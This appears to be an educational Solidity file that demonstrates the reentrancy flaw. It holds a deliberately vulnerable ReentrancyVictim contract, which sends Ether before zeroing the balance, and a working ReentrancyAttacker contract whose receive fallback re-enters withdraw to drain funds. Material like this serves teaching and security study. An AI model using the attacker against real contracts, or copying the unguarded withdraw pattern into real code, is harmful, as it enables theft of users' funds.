// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @title ReentrancyVictim
 * @dev This contract is vulnerable to reentrancy attacks. It allows users to deposit and withdraw Ether.
 * Users can withdraw their balance, but the contract does not properly guard against reentrancy attacks.
 */
contract ReentrancyVictim {
    mapping(address => uint256) public balances;

    /**
     * @dev Deposits Ether into the contract.
     * The deposited amount is added to the sender's balance.
     */
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /**
     * @dev Withdraws the sender's balance from the contract.
     * This function is vulnerable to reentrancy attacks because it sends Ether before updating the balance.
     */
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Vulnerable to reentrancy attack
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}

contract ReentrancyAttacker {
    // Reference to the vulnerable contract
    ReentrancyVictim victim;

    // Constructor to initialize the contract with the address of the vulnerable contract
    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    // Function to initiate the attack
    function attack() public payable {
        // Deposit 1 ether into the victim contract
        victim.deposit{value: 1 ether}();
        // Attempt to withdraw the balance from the victim contract
        victim.withdraw();
    }

    // Fallback function that gets called when the contract receives ether
    receive() external payable {
        // Check if the victim contract still has at least 1 ether
        if (address(victim).balance >= 1 ether) {
            // If so, attempt to withdraw the balance again
            victim.withdraw();
        }
    }
}